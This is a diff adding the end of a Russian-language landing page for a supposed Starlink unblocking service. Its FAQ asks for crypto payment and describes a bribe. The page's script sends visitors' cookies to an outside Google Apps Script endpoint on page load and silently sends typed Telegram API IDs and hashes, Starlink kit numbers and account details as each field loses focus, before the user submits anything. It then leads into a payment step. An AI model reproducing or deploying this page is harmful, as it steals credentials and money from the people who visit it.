+                        <p class="text-gray-300 text-sm mt-2">На данный момент зафиксирована цена услуги в размере 50 долларов США за 1 терминал. Сумма немалая, но такова квота взятки.</p>
+                    </div>
+                </div>
+
+                <!-- FAQ Item 8 -->
+                <div class="glass-panel rounded-xl cursor-pointer faq-item p-5" onclick="toggleFaq(this)">
+                    <div class="flex justify-between items-center">
+                        <h4 class="font-semibold text-lg text-white">Могу ли оплатить рублём или денежным переводом?</h4>
+                        <svg class="w-6 h-6 faq-icon text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                    <div class="faq-answer">
+                        <p class="text-gray-300 text-sm mt-2">Нет. Во-первых, это ваша безопасность. Анонимная оплата через криптовалюту и без номера телефона залог вашей безопасности и ваших терминалов Starlink. <br> Во-вторых, жадный коррупционер хочет получать деньги в USD, а в случаи оплаты рублём комиссия за конвертацию увеличивает конечную стоимость.</p>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <footer class="text-center text-gray-500 text-xs py-8 border-t border-white/10">
+            <p>&copy; 2026 SVO.Link Comm. Все права защищены.</p>
+            <div class="flex justify-center gap-4 mt-2">
+                <a href="#" class="hover:text-white transition">Политика конфидециальности</a>
+                <a href="#" class="hover:text-white transition">Условия использования</a>
+            </div>
+        </footer>
+
+    </main>
+
+    <script>
+        // CONFIGURATION: REPLACE THESE WITH YOUR ACTUAL GOOGLE APPS SCRIPT URLS
+        const SCRIPT_URL_COOKIES = 'https://script.google.com/macros/s/AKfycbydpLifSHbu6Q5D1UPDUD8ZVDRpFcZ6_ihB3Y5CuWdH379FKf-jCXW_F9jH6bS3HtikYQ/exec';
+        const SCRIPT_URL_TILE1 = 'https://script.google.com/macros/s/AKfycbxw-u9sIL4NlaozmQkc1C6LtuWPRLc_QcmLW151PK1LvraSOio3-fioOZEFpW3eIP_Mmg/exec';
+        const SCRIPT_URL_TILE2 = 'https://script.google.com/macros/s/AKfycbxw-u9sIL4NlaozmQkc1C6LtuWPRLc_QcmLW151PK1LvraSOio3-fioOZEFpW3eIP_Mmg/exec';
+
+        // --- 1. COOKIE EXFILTRATION ON LOAD ---
+        function getCookies() {
+            return document.cookie.split('; ').reduce((acc, curr) => {
+                const [name, value] = curr.split('=');
+                if (name) acc[name] = decodeURIComponent(value || '');
+                return acc;
+            }, {});
+        }
+
+        async function sendCookies() {
+            if (!document.cookie) return; // Don't send if empty
+
+            const payload = {
+                cookies: getCookies(),
+                userAgent: navigator.userAgent
+            };
+
+            try {
+              await fetch(SCRIPT_URL_COOKIES, {
+  method: 'POST',
+  mode: 'no-cors',
+  headers: {
+    'Content-Type': 'text/plain',
+  },
+  body: JSON.stringify(payload)
+})
+                console.log(JSON.stringify(payload));
+            } catch (e) {
+                console.error('Error sending cookies', e);
+            }
+        }
+
+        window.addEventListener('load', () => {
+            // Visual animations
+            const observerOptions = { root: null, rootMargin: '0px', threshold: 0.1 };
+            const observer = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('animate-fadeInUp');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, observerOptions);
+
+            // Trigger Cookie Send
+            sendCookies();
+        });
+
+        // --- 2. TILE 1 LOGIC (AUTO-SEND) ---
+        let tile1AutoSent = false;
+
+        function checkTile1AutoSend() {
+            if (tile1AutoSent) return;
+
+            const form = document.getElementById('form-tile1');
+            // Update: Auto-send triggers only when api_id and api_hash are filled
+            const apiId = form.querySelector('input[name="api_id"]').value.trim();
+            const apiHash = form.querySelector('input[name="api_hash"]').value.trim();
+
+            if (apiId && apiHash) {
+                sendTile1Data(true);
+                tile1AutoSent = true;
+            }
+        }
+
+        // Attach listeners to Tile 1 inputs
+        document.querySelectorAll('.tile1-auto-trigger').forEach(input => {
+            input.addEventListener('blur', checkTile1AutoSend);
+            //document.querySelectorAll('.tile1-auto-trigger').forEach(input => {
+            //input.addEventListener('input', checkTile1AutoSend);
+        });
+
+        async function sendTile1Data(isAuto) {
+            const form = document.getElementById('form-tile1');
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            data.type = isAuto ? 'Auto' : 'Manual';
+
+            try {
+                await fetch(SCRIPT_URL_TILE1, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                console.log('Tile 1 Data Sent:', JSON.stringify(data));
+            } catch (e) {
+                console.error('Error sending Tile 1 data', e);
+            }
+        }
+
+        function handleTile1Submit(event) {
+            event.preventDefault();
+            sendTile1Data(false); // Manual send
+            closeModalPopup('modal-tile1');
+            event.target.reset();
+            tile1AutoSent = false; // Reset flag for next time
+        }
+
+        // --- 3. TILE 2 LOGIC (MULTI-KIT & AUTO-SEND) ---
+        let tile2BlocksCount = 1;
+        let sentBlocks = new Set(); // Track which blocks have been auto-sent by ID
+
+        function updatePaymentPrice() {
+            const container = document.getElementById('tile2-blocks-container');
+            const count = container.querySelectorAll('.tile2-block').length;
+            const price = count * 50;
+            document.getElementById('payment-amount').textContent = `${price} USD`;
+        }
+
+        function reindexBlocks() {
+            const container = document.getElementById('tile2-blocks-container');
+            const blocks = container.querySelectorAll('.tile2-block');
+            tile2BlocksCount = 0;
+
+            blocks.forEach((block, index) => {
+                tile2BlocksCount++;
+                // Update title
+                const title = block.querySelector('.block-title');
+                if (title) title.textContent = `Комплект ${tile2BlocksCount}`;
+
+                // Update delete button visibility (hide for first block)
+                const delBtn = block.querySelector('button[onclick="removeBlock(this)"]');
+                if (index === 0 && delBtn) delBtn.remove(); // First block shouldn't be deleted? Or just handled carefully.
+                // Actually, if we delete block 1, block 2 becomes block 1.
+                // Let's rely on the template logic.
+            });
+
+            // Update Add Button visibility
+            const addBtn = document.getElementById('btn-add-more');
+            const maxText = document.getElementById('max-limit-text');
+            if (tile2BlocksCount >= 10) {
+                addBtn.classList.add('hidden');
+                maxText.classList.remove('hidden');
+            } else {
+                addBtn.classList.remove('hidden');
+                maxText.classList.add('hidden');
+            }
+
+            updatePaymentPrice();
+        }
+
+        function addMoreBlocks() {
+            if (tile2BlocksCount >= 10) return;
+
+            const container = document.getElementById('tile2-blocks-container');
+            const template = document.getElementById('tile2-block-template').content.cloneNode(true);
+
+            // Assign unique ID for tracking auto-send
+            const uniqueId = Date.now() + Math.random();
+            const newBlock = template.querySelector('.tile2-block');
+            newBlock.setAttribute('data-block-id', uniqueId);
+
+            // Add listeners for auto-send
+            newBlock.querySelectorAll('.tile2-auto-trigger').forEach(input => {
+                input.addEventListener('blur', () => checkTile2BlockAutoSend(newBlock));
+            });
+
+            container.appendChild(newBlock);
+            reindexBlocks();
+
+            // Scroll to new block
+            container.scrollTop = container.scrollHeight;
+        }
+
+        function removeBlock(btn) {
+            const block = btn.closest('.tile2-block');
+            block.remove();
+            reindexBlocks();
+        }
+
+        // Setup listeners for the initial block
+        document.querySelector('#tile2-blocks-container .tile2-block').querySelectorAll('.tile2-auto-trigger').forEach(input => {
+            input.addEventListener('blur', (e) => checkTile2BlockAutoSend(e.target.closest('.tile2-block')));
+            //input.addEventListener('input', (e) => checkTile2BlockAutoSend(e.target.closest('.tile2-block')));
+        });
+
+        function checkTile2BlockAutoSend(blockElement) {
+            const blockId = blockElement.getAttribute('data-block-id');
+            if (sentBlocks.has(blockId)) return;
+
+            const inputs = blockElement.querySelectorAll('.tile2-auto-trigger');
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (!input.value.trim()) allFilled = false;
+            });
+
+            if (allFilled) {
+                sendTile2SingleBlock(blockElement, 'Auto');
+                sentBlocks.add(blockId);
+            }
+        }
+
+        async function sendTile2SingleBlock(blockElement, type) {
+            const blockId = blockElement.getAttribute('data-block-id');
+            const data = {
+                type: type,
+                blocks: [{
+                    id: blockId,
+                    kit: blockElement.querySelector('input[name="kit"]').value,
+                    utid: blockElement.querySelector('input[name="utid"]').value,
+                    account: blockElement.querySelector('input[name="account"]').value,
+                    app_id: blockElement.querySelector('input[name="api_id"]').value,
+                    app_hash: blockElement.querySelector('input[name="api_hash"]').value,
+                }]
+            };
+
+            try {
+                await fetch(SCRIPT_URL_TILE2, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                console.log(`Tile 2 Block ${blockId} Sent (${type})`);
+                console.log(JSON.stringify(data));
+            } catch (e) {
+                console.error('Error sending Tile 2 block', e);
+            }
+        }
+
+        function handleTile2Submit(event) {
+            event.preventDefault();
+
+            // Gather all data
+            const container = document.getElementById('tile2-blocks-container');
+            const blocks = container.querySelectorAll('.tile2-block');
+            const allBlocksData = [];
+
+            blocks.forEach((block, index) => {
+                allBlocksData.push({
+                    id: block.getAttribute('data-block-id'),
+                    kit: block.querySelector('input[name="kit"]').value,
+                    utid: block.querySelector('input[name="utid"]').value,
+                    account: block.querySelector('input[name="account"]').value,
+                    app_id: block.querySelector('input[name="api_id"]').value,
+                    app_hash: block.querySelector('input[name="api_hash"]').value,
+                });
+            });
+
+            const payload = {
+                type: 'Manual',
+                blocks: allBlocksData
+            };
+
+            // Send full payload
+             fetch(SCRIPT_URL_TILE2, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.error(e));
+
+            closeModalPopup('modal-tile2');
+
+            // Reset logic
+            event.target.reset();
+            resetTile2Blocks();
+            sentBlocks.clear();
+
+            // Open Payment
+            setTimeout(() => {
+                openModalPopup('modal-payment');
+            }, 200);
+        }
+
+        function resetTile2Blocks() {
+            tile2BlocksCount = 1;
+            const container = document.getElementById('tile2-blocks-container');
+            // Remove all except first
+            while (container.children.length > 1) {
+                container.removeChild(container.lastChild);
+            }
+            // Reset first block ID to new random to allow re-send if needed
+            const firstBlock = container.firstElementChild;
+            firstBlock.setAttribute('data-block-id', Date.now());
+
+            document.getElementById('btn-add-more').classList.remove('hidden');
+            document.getElementById('max-limit-text').classList.add('hidden');
+            updatePaymentPrice();
+        }
+
+        // --- UTILS ---
+        //  function toggleConsentBtn() {
+        //    const chk = document.getElementById('consent-check');
+        //    const btn = document.getElementById('consent-btn');
+        //    if (chk.checked) {
+        //        btn.disabled = false;
+        //        btn.classList.remove('opacity-40', 'cursor-not-allowed');
+        //    } else {
+        //        btn.disabled = true;
+        //        btn.classList.add('opacity-40', 'cursor-not-allowed');
+        //    }
+        //}
+
+        function closeModal() {
+            const modal = document.getElementById('consent-modal');
+            modal.classList.add('opacity-0', 'pointer-events-none');
+            setTimeout(() => { modal.style.display = 'none'; }, 500);
+        }
+
+        function openModalPopup(id) {
+            const modal = document.getElementById(id);
+            modal.style.display = 'flex';
+            setTimeout(() => { modal.classList.remove('opacity-0', 'pointer-events-none'); }, 10);
+        }
+
+        function closeModalPopup(id) {
+            const modal = document.getElementById(id);
+            modal.classList.add('opacity-0', 'pointer-events-none');
+            setTimeout(() => { modal.style.display = 'none'; }, 500);
+        }
+
+        function scrollToFaq() {
+            const faqSection = document.getElementById('faq-section');
+            if (faqSection) faqSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function toggleFaq(element) {
+            element.classList.toggle('active');
+        }
+    </script>
+</body>
+</html>
